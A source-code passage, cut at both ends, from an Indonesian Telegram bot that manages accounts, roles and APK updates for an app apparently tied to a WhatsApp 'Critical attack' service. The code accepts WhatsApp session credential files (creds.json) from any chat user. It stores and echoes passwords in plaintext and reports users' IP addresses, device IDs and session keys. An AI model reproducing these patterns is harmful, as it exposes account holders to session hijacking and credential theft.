  const account = oldPersonal || oldByUsername || { telegramId: String(telegramId), username: pending.username, password: pending.password, role: pending.role, createdByTelegramId: String(telegramId), personal: true };
  account.telegramId = String(telegramId); account.username = pending.username; account.password = pending.password;
  account.role = pending.role; account.personal = true; account.expiredDate = expired.toISOString().split("T")[0];
  if (!db.includes(account)) db.push(account);
  saveDatabase(db); pendingGroupAccounts.delete(telegramId);
  return bot.sendMessage(telegramId, `Akun berhasil dibuat.\nUsername: ${account.username}\nPassword: ${account.password}\nRole: ${String(account.role).toUpperCase()}\nDurasi: ${days} hari`);
}

// ===== APK Update Command =====
bot.onText(/^\/?(?:updateapk|setupdate)(?:\s+(.+))?$/i, async (msg, match) => {
  const requesterId = Number(msg.from?.id);
  const config = loadTelegramConfig();
  const isOwner = requesterId === OWNER_ID || config.ownerList.includes(requesterId);
  if (!isOwner) return bot.sendMessage(msg.chat.id, "Hanya owner yang dapat mengatur update APK.");

  const payload = String(match[1] || "").trim();
  const replyText = String(msg.reply_to_message?.text || msg.reply_to_message?.caption || "");
  const parts = payload.split("|").map(item => item.trim());
  const versionCode = Number(parts[0]);
  const versionName = parts[1] || "";
  const apkUrl = normalizeGithubApkUrl(parts[2] || (replyText.match(/https?:\/\/[^\s]+/i) || [""])[0]);
  const releaseNotes = parts.slice(3).join(" | ") || "Pembaruan aplikasi tersedia.";
  if (!Number.isInteger(versionCode) || versionCode < 1 || !versionName || !apkUrl) {
    return bot.sendMessage(msg.chat.id, "Format: /updateapk versionCode|versionName|link_github_apk|catatan\nContoh: /updateapk 2|1.1.0|https://github.com/user/repo/releases/download/v1/app.apk|Perbaikan bug");
  }
  const update = { versionCode, versionName, apkUrl, releaseNotes, updatedAt: new Date().toISOString() };
  saveAppUpdate(update);
  return bot.sendMessage(msg.chat.id, `Update APK berhasil disimpan.\nVersi: ${versionName} (${versionCode})\nLink: ${apkUrl}`);
});

// ===== Command Handlers =====
bot.onText(/^\/?(start|menu)(?:\s+.*)?$/i, async (msg) => {
  const id = msg.from.id;
  if (msg.chat.type !== "private") {
    return bot.sendMessage(msg.chat.id, "Menu bot hanya dapat diakses melalui Private Chat!", {
      reply_markup: { inline_keyboard: [[{ text: "Buka Private Chat", url: `https://t.me/${process.env.BOT_USERNAME || "Criticalmanager_bot"}` }]] }
    });
  }
  const config = loadTelegramConfig();
  const isOwner = id === Number(OWNER_ID) || config.ownerList.map(Number).includes(id);
  const isDeveloper = config.developerList.map(Number).includes(id);
  const isUser = isTelegramAuthorized(id);
  if (!isUser) return bot.sendMessage(id, "Kamu belum terdaftar. Silakan hubungi admin atau masuk melalui grup yang sudah diatur role-nya.");
  const account = getTelegramAccount(id);
  const role = String(account?.role || (isOwner ? "owner" : isDeveloper ? "developer" : "member")).toUpperCase();
  const inlineKeyboard = [
    [{ text: "✓ Buat Akun", callback_data: "create_personal_account", style: "success" }],
    [{ text: "⚝ Buat Member", callback_data: "create_member", style: "primary" }],
    [{ text: "➤ Cek Akun Saya", callback_data: "check_my_account", style: "primary" }],
    [{ text: "✘ Hapus Akun Saya", callback_data: "delete_my_account", style: "danger" }],
    ...((isOwner || isDeveloper) ? [[{ text: "➤ List Member", callback_data: "list_user", style: "primary" }, { text: "✘ Hapus User", callback_data: "delete_user", style: "danger" }]] : [])
  ];
  const text = `<b>⚝ CRITICAL ACCOUNT MANAGER</b>\n\n<blockquote>Bot ini digunakan untuk pembuatan &amp; manajemen akun secara otomatis dan aman.\n\n<b>Cara Membuat Akun:</b>\n➤ Klik tombol <b>✓ Buat Akun</b>\n➤ Balas pesan dengan format <code>username password</code>\n➤ Gunakan data tersebut untuk login ke aplikasi\n\n<b>Status Akses Anda:</b>\n➤ ID Telegram: <code>${id}</code>\n➤ Role: <b>${role}</b>\n\n<b>✓ Sistem aktif dan siap digunakan.</b></blockquote>`;
  await sendStyledRichMessage(id, text, inlineKeyboard, { reply_markup: { inline_keyboard: inlineKeyboard } });
});
bot.onText(/^\/?setgroup(?:\s+([A-Za-z0-9_-]+))?$/i, async (msg, match) => {
  if (!["group", "supergroup"].includes(msg.chat.type)) return bot.sendMessage(msg.chat.id, "Perintah ini hanya dapat digunakan di grup.");
  if (!isTelegramAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, "❖Hanya owner/developer yang dapat mengatur role grup.");
  const role = normalizeRoleName(match[1] || "member");
  const roles = loadGroupRoles(); roles[String(msg.chat.id)] = role; saveGroupRoles(roles);
  return bot.sendMessage(msg.chat.id, `Grup ini berhasil diatur dengan role: ${role}`);
});

bot.onText(/^\/?unsetgroup$/i, (msg) => {
  if (!["group", "supergroup"].includes(msg.chat.type) || !isTelegramAdmin(msg.from.id)) return;
  const roles = loadGroupRoles(); delete roles[String(msg.chat.id)]; saveGroupRoles(roles);
  return bot.sendMessage(msg.chat.id, "Role grup berhasil dihapus.");
});

bot.onText(/^\/?kick(?:\s+(@?[A-Za-z0-9_]+|-?\d+))?(?:\s+(.+))?$/i, async (msg, match) => {
  if (!["group", "supergroup"].includes(msg.chat.type)) return bot.sendMessage(msg.chat.id, "Perintah ini hanya dapat digunakan di grup.");
  if (!isTelegramAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, "Hanya owner/developer yang dapat melakukan kick.");
  const target = msg.reply_to_message?.from || (match[1] ? { id: /^\d+$/.test(match[1]) ? Number(match[1]) : null, username: match[1].replace(/^@/, "") } : null);
  if (!target?.id) return bot.sendMessage(msg.chat.id, "Gunakan /kick ID alasan atau reply pesan target dengan /kick alasan.");
  try {
    await bot.kickChatMember(msg.chat.id, target.id);
    revokeGroupAccount(target.id, msg.chat.id);
    return bot.sendMessage(msg.chat.id, `Member berhasil dikeluarkan.\nAlasan: ${match[2] || "Tidak ada alasan"}`);
  } catch (error) {
    console.error("[KICK]", error.response?.body || error.message);
    return bot.sendMessage(msg.chat.id, "Gagal kick. Pastikan bot adalah admin dengan izin ban users.");
  }
});

bot.onText(/^\/?listmember$/i, (msg) => {
  if (!["group", "supergroup"].includes(msg.chat.type) || !isTelegramAdmin(msg.from.id)) return;
  const members = loadDatabase().filter(user => String(user.groupId || "") === String(msg.chat.id));
  const text = members.length ? members.map((user, i) => `${i + 1}. ${user.telegramUsername ? "@" + user.telegramUsername : user.telegramId} | ${user.username} | ${user.role} | ${user.expiredDate || "-"}`).join("\n") : "Belum ada member terverifikasi.";
  return bot.sendMessage(msg.chat.id, `List Member\nRole Grup: ${getGroupRole(msg.chat.id) || "belum diset"}\n\n${text}`);
});

bot.on("new_chat_members", async (msg) => {
  for (const member of msg.new_chat_members || []) await verifyGroupMember(msg, member);
});

bot.on("chat_member", async (update) => {
  const chatId = update.chat?.id; const member = update.new_chat_member?.user;
  if (!chatId || !member) return;
  const oldStatus = update.old_chat_member?.status; const newStatus = update.new_chat_member?.status;
  if (["member", "administrator", "restricted"].includes(newStatus) && ["left", "kicked"].includes(oldStatus)) {
    const fakeMessage = { chat: { id: chatId }, message_id: update.message_id };
    await verifyGroupMember(fakeMessage, member);
  } else if (["left", "kicked"].includes(newStatus)) revokeGroupAccount(member.id, chatId);
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.new_chat_members) {
    for (const member of msg.new_chat_members) await verifyGroupMember(msg, member);
  }

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '✘ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      // Simpan ke folder sessions/<userId>/
      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      // Jika file sudah ada, buat nama acak
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.onText(/^\/?refresh/, async (msg) => {
  const config = loadTelegramConfig();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = config.ownerList.includes(userId);
  if (!isOwner) return bot.sendMessage(chatId, "✘ Kamu tidak memiliki izin untuk menggunakan perintah ini.")
  await refreshUserSessions()
  await bot.sendMessage(chatId, "⚠️ Server Is Refreshing wait for 30-60 Seconds.");
})

bot.onText(/^\/?addadmin\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(userId);
  if (!isOwner) return bot.sendMessage(chatId, "✘ Kamu tidak memiliki izin untuk menggunakan perintah ini⚝.");

  const targetId = parseInt(match[1], 10);
  if (Number.isNaN(targetId)) {
    return bot.sendMessage(chatId, "✘ Format salah. Gunakan /addadmin <telegram_id>.");
  }

  if (!config.developerList.includes(targetId)) {
    config.developerList.push(targetId);
  }
  if (!config.userList.includes(targetId)) {
    config.userList.push(targetId);
  }

  saveTelegramConfig(config);
  bot.sendMessage(chatId, `✅ Telegram ID ${targetId} berhasil ditambahkan sebagai developer.`);
})

bot.onText(/^\/(\d+)(?:\s+(\d+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const requesterId = msg.from.id;
  const config = loadTelegramConfig();
  const isAllowed = config.ownerList.includes(requesterId) || config.developerList.includes(requesterId) || config.userList.includes(requesterId);

  if (!isAllowed) {
    return bot.sendMessage(chatId, "✘ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const telegramId = String(match[1] || "").trim();
  const addDays = String(match[2] || "").trim();

  if (!telegramId || !addDays) {
    return bot.sendMessage(chatId, "⚠️ Format salah.\nGunakan `/telegram_id jumlah_hari`\nContoh: `/628123456789 30`", {
      parse_mode: "Markdown"
    });
  }

  const db = loadDatabase();
  const user = findUserByIdentity(db, telegramId);
  if (!user) {
    return bot.sendMessage(chatId, `✘ User dengan Telegram ID ${telegramId} tidak ditemukan.`);
  }

  if (!config.ownerList.includes(requesterId) && user.role !== "member") {
    return bot.sendMessage(chatId, "✘ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
  }

  const result = extendUserExpiry(user, addDays);
  if (!result.ok) {
    return bot.sendMessage(chatId, result.message);
  }

  saveDatabase(db);
  return bot.sendMessage(chatId, `✅ Akses ${user.username} (${telegramId}) diperpanjang ${addDays} hari.\n⏳ Expired baru: ${user.expiredDate}`);
});

bot.onText(/^\/?globalsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "✘ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "lu ngapain");
  }

  const connectedBiz = Object.keys(biz);
  const connectedMess = Object.keys(mess);
  const connectedNumbers = Object.keys(activeConnections);

  const onlineMess = connectedMess || [];
  const onlineBiz = connectedBiz || [];
  const onlineNumbers = connectedNumbers || [];

  let message = `📌 Global Session\n\n`;

  message += 'Messenger Session:\n';
  message += onlineMess.length > 0
    ? connectedMess.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nBusiness Session:\n';
  message += onlineBiz.length > 0
    ? connectedBiz.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nActive Numbers:\n';
  message += onlineNumbers.length > 0
    ? connectedNumbers.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  bot.sendMessage(chatId, message);
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const normalizedId = Number(id);
  const isOwner = normalizedId === Number(OWNER_ID) || config.ownerList.map(Number).includes(normalizedId);
  const isDeveloper = config.developerList.map(Number).includes(normalizedId);
  // Samakan dengan validasi pada /start, termasuk akun yang tersimpan di database.
  const isUser = isTelegramAuthorized(normalizedId);

  if (!isUser) {
    return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan.", show_alert: true });
  }

  // Hentikan indikator loading Telegram untuk callback yang memulai input.
  try { await bot.answerCallbackQuery(query.id); } catch { }

  switch (data) {
    case "create_personal_account": {
      const creator = getTelegramAccount(id);
      const role = normalizeRoleName(creator?.role || (isOwner ? "owner" : isDeveloper ? "developer" : "member"));


      // Simpan status bahwa user ini sedang berada di tahap pengisian akun
      userSessionState[id] = { step: "awaiting_credentials", role };

      await bot.sendMessage(id, `<b>⚝ CRITICAL ACCOUNT CREATION</b>\n\n<blockquote><b>✓ Role:</b> ${role.toUpperCase()}\n\n<b>Cara membuat akun:</b>\n➤ Balas pesan ini dengan format:\n<code>username password</code>\n\n<b>Contoh:</b>\n<code>kenz 123</code>\n\n✓ Username dan password akan diproses setelah durasi dipilih.</blockquote>`, { parse_mode: "HTML", reply_markup: { force_reply: true } });

      // Handler harus berada di blok ini supaya variabel `role` tersedia.
      const receiveCredentials = input => {
        if (input.from?.id !== id || input.chat?.id !== id || !input.text) {
          return bot.once("message", receiveCredentials);
        }
        const fields = input.text.trim().split(/\s+/);
        const [username, password] = fields;
        if (fields.length !== 2 || !username || !password) {
          bot.sendMessage(id, "Format salah. Gunakan tepat: username password", { parse_mode: "HTML" });
          return bot.once("message", receiveCredentials);
        }
        pendingGroupAccounts.set(id, { username, password, role });
        return bot.sendMessage(id, `<b>⚝ PILIH DURASI AKUN</b>\n\n<blockquote><b>✓ Username:</b> ${sanitize(username)}\n<b>✓ Role:</b> ${role.toUpperCase()}\n\n➤ Pilih masa aktif akun di bawah ini.</blockquote>`, { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "➤ 1 Hari", callback_data: "duration_1" }, { text: "➤ 14 Hari", callback_data: "duration_14" }], [{ text: "✓ 30 Hari", callback_data: "duration_30" }], [{ text: "⚝ Atur Hari Sendiri", callback_data: "duration_custom" }], [{ text: "✘ Kembali", callback_data: "back_menu" }]] } });
      };
      bot.once("message", receiveCredentials);
      break;
    }

    case "duration_custom": {
      const pending = pendingGroupAccounts.get(id);
      if (!pending) return bot.answerCallbackQuery(query.id, { text: "Sesi telah berakhir.", show_alert: true });
      await bot.sendMessage(id, "Ketik jumlah hari, contoh: 45");
      bot.once("message", input => {
        if (input.from?.id !== id || !input.text) {
          return bot.sendMessage(id, "Masukkan jumlah hari yang valid, contoh: 45.");
        }
        const days = Number.parseInt(input.text.trim(), 10);
        if (!Number.isInteger(days) || days < 1 || days > 20000000) {
          return bot.sendMessage(id, "Jumlah hari harus antara 1 sampai berapa pun.");
        }
        return finalizeTelegramAccount(id, pending, days);
      });
      break;
    }

    case "duration_1":
    case "duration_14":
    case "duration_30": {
      const pending = pendingGroupAccounts.get(id);
      if (!pending) return bot.answerCallbackQuery(query.id, { text: "Sesi telah berakhir.", show_alert: true });
      return finalizeTelegramAccount(id, pending, Number(data.split("_").pop()));
    }

    case "back_menu":
      return bot.sendMessage(id, "Jalankan /start untuk membuka menu utama.");

    case "check_my_account": {
      const account = getTelegramAccount(id);
      return bot.sendMessage(id, account ? `Data Akun Saya\n\nUsername: ${account.username}\nPassword: ${account.password}\nRole: ${account.role}\nExpired: ${account.expiredDate || "-"}` : "Kamu belum membuat akun personal.\nSilakan pilih tombol Buat Akun terlebih dahulu.");
    }

    case "delete_my_account": {
      const db = loadDatabase(); const kept = db.filter(user => String(user.telegramId || "") !== String(id));
      if (kept.length === db.length) return bot.sendMessage(id, "Kamu belum membuat akun personal.\nSilakan pilih tombol Buat Akun terlebih dahulu.");
      saveDatabase(kept); return bot.sendMessage(id, "Akun personal berhasil dihapus.");
    }

    case "create_member":
      bot.sendMessage(id, "Masukkan data: `telegram_id|username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [telegramId, username, password, day] = msg.text.split("|").map(item => item.trim());
        const db = loadDatabase();
        if (!telegramId || !username || !password || !day) {
          return bot.sendMessage(id, "✘ Format salah. Gunakan `telegram_id|username|password|durasi_hari`.");
        }
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "✘ Username sudah ada!");
        if (db.find(u => String(u.telegramId || "") === telegramId)) return bot.sendMessage(id, "✘ Telegram ID sudah terdaftar!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ telegramId, username, password, role: "member", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `⚝ Akun member dibuat:
➢ Telegram ID: ${telegramId}
➢ Username: ${username}
❖ Password: ${password}`);
      });
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username_atau_telegram_id|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [identity, addDays] = msg.text.split("|").map(item => item.trim());
        const db = loadDatabase();
        const user = findUserByIdentity(db, identity);
        if (!user) return bot.sendMessage(id, "✘ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        // Cegah userList mengubah role selain member
        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "✘ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const result = extendUserExpiry(user, addDays);
        if (!result.ok) {
          return bot.sendMessage(id, result.message);
        }

        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${user.username} (${user.telegramId || '-'}) ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner && !isDeveloper) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*
${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner && !isDeveloper) return;
      bot.sendMessage(id, "Masukkan: `telegram_id|username|password|role|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [telegramId, username, password, role, day] = msg.text.split("|").map(item => item.trim());
        const db = loadDatabase();
        if (!telegramId || !username || !password || !role || !day) {
          return bot.sendMessage(id, "✘ Format salah. Gunakan `telegram_id|username|password|role|durasi_hari`.");
        }
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "✘ Username sudah ada!");
        if (db.find(u => String(u.telegramId || "") === telegramId)) return bot.sendMessage(id, "✘ Telegram ID sudah terdaftar!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ telegramId, username, password, role, expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun ${role} dibuat:
🆔 Telegram ID: ${telegramId}
👤 Username: ${username}
🔐 Password: ${password}`);
      });
      break;

    case "delete_user":
      if (!isOwner && !isDeveloper) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "✘ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;
  }
});

function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

bot.onText(/^\/?status$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "✘ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = JSON.parse(fs.readFileSync('./database.json'));
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;

    const pingStart = Date.now();
    await axios.get(`http://127.0.0.1:${PORT}/ping`, { timeout: 3000 });
    const ping = Date.now() - pingStart;

    const text = `*𝐂𝐫𝐢𝐭𝐢𝐜𝐚𝐥 𝐚𝐭𝐭𝐚𝐜𝐤" Server Status*

*Server Online* [${new Date().toLocaleTimeString()}]
*Ping:* ~${ping}ms
*RAM:* ${ramUsage.toFixed(2)} MB
*CPU:* ${cpuLoad.toFixed(2)}
*Uptime:* ${uptime}
*Total Database:* ${dbLength}
*Server Protect*: *Darkness-Secure*`;

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("✘ Gagal ambil status:", err.message);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
  }
});

// === Fitur Track IP ===
bot.onText(/^\/?trackip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1].trim();
  
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip) && !/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(ip)) {
    return bot.sendMessage(chatId, "⚠️ Format IP / domain tidak valid.\n\nContoh:\n`/trackip 8.8.8.8`\n`/trackip google.com`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, "🔍 Sedang melacak informasi IP...");

  try {
    const { data } = await axios.get(`https://ipapi.co/${ip}/json/`);

    if (data.error) {
      return bot.sendMessage(chatId, `✘ Gagal melacak IP: ${data.reason || "tidak ditemukan."}`);
    }

    const info = `
*IP Tracker Result*

IP: ${data.ip || ip}
Kota: ${data.city || "-"}
Negara: ${data.country_name || "-"} (${data.country_code || "?"})
Zona Waktu: ${data.timezone || "-"}
ISP: ${data.org || "-"}
Latitude: ${data.latitude || "-"}
Longitude: ${data.longitude || "-"}

Database: ${data.asn || "-"}
    `.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

    // Kirim peta lokasi (jika ada koordinat)
    if (data.latitude && data.longitude) {
      await bot.sendLocation(chatId, data.latitude, data.longitude);
    }

  } catch (err) {
    console.error("❌ Error trackip:", err.message);
    bot.sendMessage(chatId, "❌ Gagal mengambil data IP, coba lagi nanti.");
  }
});

// ===== Fitur reset akun by role =====
// Usage:
// 1) /resetakunmember        -> bot akan menanyakan konfirmasi
// 2) /resetakunmember yes    -> konfirmasi, lalu hapus semua akun role 'member'
// Sama untuk: resetakunowner, resetakunreseller, resetakunvip
// Untuk hapus semua akun: /resetall yes
// NOTE: hanya telegram owner (config.ownerList) yang boleh menjalankan.
// === FITUR RESET AKUN DENGAN BUTTON KONFIRMASI (HANYA ID KAMU) ===
// 🔐 Ganti dengan ID Telegram kamu

function loadDB() {
  if (!fs.existsSync("database.json")) fs.writeFileSync("database.json", JSON.stringify([]));
  return JSON.parse(fs.readFileSync("database.json"));
}
function saveDB(data) {
  fs.writeFileSync("database.json", JSON.stringify(data, null, 2));
}

// 🔧 Fungsi utama hapus akun
function doReset(role) {
  const db = loadDB();
  let deleted = [], remain = [];

  if (role === "all") {
    deleted = db.map(u => u.username);
    remain = [];
  } else {
    for (const u of db) {
      if ((u.role || "member") === role) deleted.push(u.username);
      else remain.push(u);
    }
  }

  saveDB(remain);
  fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");

  return deleted;
}

// 🔘 Command reset dengan tombol konfirmasi
function registerResetButton(cmd, role) {
  bot.onText(new RegExp(`^\\/?${cmd}$`, "i"), async (msg) => {
    if (msg.from.id !== OWNER_ID) return bot.sendMessage(msg.chat.id, "✘ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

    const roleName = role === "all" ? "SEMUA AKUN" : `role *${role}*`;
    const opts = {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ Konfirmasi", callback_data: `confirm_${cmd}` }],
          [{ text: "✘ Batal", callback_data: "cancel_reset" }]
        ]
      }
    };
    bot.sendMessage(msg.chat.id, `⚠️ Apakah kamu yakin ingin menghapus ${roleName}?`, opts);
  });

  // Handle klik tombol konfirmasi
  bot.on("callback_query", async (query) => {
    const data = query.data;
    const fromId = query.from.id;
    const chatId = query.message.chat.id;

    if (data === `confirm_${cmd}`) {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true }).catch(() => {});
      }

      const deleted = doReset(role);
      const info = deleted.length > 0 ? `✅ ${deleted.length} akun dihapus.` : "ℹ️ Tidak ada akun yang dihapus.";

      await bot.sendDocument(chatId, "reset_result.txt", {
        caption: `*Berhasil menghapus ${deleted.length} akun*\n${role === "all" ? "🗑 Semua akun" : `🗑 Role: ${role}`}`,
        parse_mode: "Markdown"
      });
      return bot.answerCallbackQuery(query.id, { text: info }).catch(() => {});
    }

    if (data === "cancel_reset") {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true }).catch(() => {});
      }
      bot.answerCallbackQuery(query.id, { text: "✘ Dibatalkan." }).catch(() => {});
      bot.sendMessage(chatId, "🚫 Aksi reset dibatalkan.");
    }
  });
}

// 🔹 Daftarkan semua perintah
registerResetButton("resetakunowner", "owner");
registerResetButton("resetakunreseller", "reseller");
registerResetButton("resetakunvip", "vip");
registerResetButton("resetakunmember", "member");
registerResetButton("resetall", "all");

// === FITUR /INFO <username> ===
bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== OWNER_ID) {
    return bot.sendMessage(chatId, "✘ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const username = match[1].trim().toLowerCase();

  try {
    if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

    const db = JSON.parse(fs.readFileSync("database.json"));
    const keys = JSON.parse(fs.readFileSync("keyList.json"));

    // cari data akun
    const dbUser = db.find(u => (u.username || "").toLowerCase() === username);
    const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

    if (!dbUser && !keyUser) {
      return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    // ambil data dari database.json
    const role = dbUser?.role || "member";
    const expired = dbUser?.expiredDate || "Tidak ada";
    const lastSend = dbUser?.lastSend
      ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum pernah";

    // ambil data dari keyList.json
    const lastLogin = keyUser?.lastLogin
      ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum login";
    const ip = keyUser?.ipAddress || "Tidak diketahui";
    const android = keyUser?.androidId || "-";
    const session = keyUser?.sessionKey || "-";

    const info = `
*INFORMASI AKUN*

*Username:* ${dbUser?.username || keyUser?.username || username}
*Role:* ${role}
*Expired Date:* ${expired}
*Terakhir Kirim:* ${lastSend}
*Terakhir Login:* ${lastLogin}
*IP Address:* ${ip}
*Android ID:* ${android}
*Session Key:* \`${session}\`
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error info:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
  }
});

// === FITUR /STATS - STATUS BOT & USER ===
const startTime = Date.now();

function getUptime() {
  const seconds = Math.floor((Date.now() - startTime) / 1000);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}j ${m}m ${s}d`;
}

bot.onText(/^\/?(stats|status)$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "✘ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    // === Load database user ===
    let users = [];
    if (fs.existsSync("database.json")) {
      users = JSON.parse(fs.readFileSync("database.json"));
    }

    const totalUser = users.length;
    const countRole = (role) => users.filter(u => (u.role || "member") === role).length;

    const owners = countRole("owner");
    const resellers = countRole("reseller");
    const vips = countRole("vip");
    const members = countRole("member");

    // === Cek session WhatsApp aktif (jika pakai Baileys MD) ===
    const connectedMess = Object.keys(mess || {}).length || 0;
    const connectedBiz = Object.keys(biz || {}).length || 0;
    const connectedNumbers = Object.keys(activeConnections || {}).length || 0;

    // === Buat tampilan stats ===
    const info = `
*Bot Statistics*

*Status:* Online
*Uptime:* ${getUptime()}

*User Data*
• Total User: ${totalUser}
• Owner: ${owners}
• Reseller: ${resellers}
• VIP: ${vips}
• Member: ${members}

*WhatsApp Session*
• Messenger: ${connectedMess}
• Business: ${connectedBiz}
• Active Numbers: ${connectedNumbers}

*Tanggal:* ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error stats:", err);
    bot.sendMessage(chatId, "❌ Gagal mengambil data stats.");
  }
});

bot.onText(/^\/?statususer$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "✘ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const dbPath = "./database.json";
    const logPath = "logUser.txt";

